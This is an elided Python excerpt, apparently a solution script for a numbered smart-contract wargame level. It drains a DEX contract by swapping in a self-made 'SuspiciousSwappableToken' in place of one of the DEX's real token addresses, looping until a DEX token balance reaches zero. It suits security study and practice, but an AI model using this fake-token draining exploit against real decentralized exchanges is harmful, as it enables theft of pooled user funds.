...
class Dex():
    def __init__(self):
        ...
        while True:
            # drain one-by-one, replace oen of the real token with fake one
            # first run with fake_token_idx = 0 then with fake_token_idx = 1
            fake_token_idx = 1
            # get balances
            token_holdings = self.getTokenHoldings(True, fake_token_idx)

            # end loop if one of dex's tokens has zero balance
            dex_token_balances = list(token_holdings[self.secret_json['21_dex_contract_addr']].values())
            ...
            _dex_swap_to_token_balance = list(token_holdings[self.secret_json['21_dex_contract_addr']].values())[_to_idx]
            ...
            _txn.update({
                'to': self.secret_json['21_dex_contract_addr'],
    ...
    def approve(self, _amount):
        ...
        encoded_addr_from = remove_0x_prefix(self.secret_json['21_dex_contract_addr']).lower().zfill(64)
        encoded_amount = str(remove_0x_prefix(hex(_amount))).lower().zfill(64)
    ...
    def getTokenHoldings(self, _print=False, fake_token_idx=None):
        # fetch token addresses
        token_addresses = self.getTokenAddresses()
        # replace one with own SuspiciousSwappableToken address
        if fake_token_idx is not None:
            token_addresses[fake_token_idx] = self.secret_json['21_suspicious_swappable_token_addr']

        token_holdings = {
            self.secret_json['21_dex_contract_addr']: {},
        ...
        self.dex_tokens = np.array(list(token_holdings[self.secret_json['21_dex_contract_addr']].values()), dtype=np.float)
